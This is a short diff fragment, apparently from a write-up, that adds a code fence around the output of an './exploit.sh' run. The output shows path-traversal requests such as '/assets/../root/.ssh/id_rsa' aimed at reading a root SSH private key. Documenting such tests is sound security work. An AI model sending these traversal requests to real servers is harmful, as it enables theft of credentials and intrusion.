@@ -214,6 +214,7 @@ done
 
 [★]$ ./exploit.sh
 ```
+```
 [+] Testing with /assets/../root/.ssh/id_rsa
 	Status code --> 404
 [+] Testing with /assets/../../root/.ssh/id_rsa
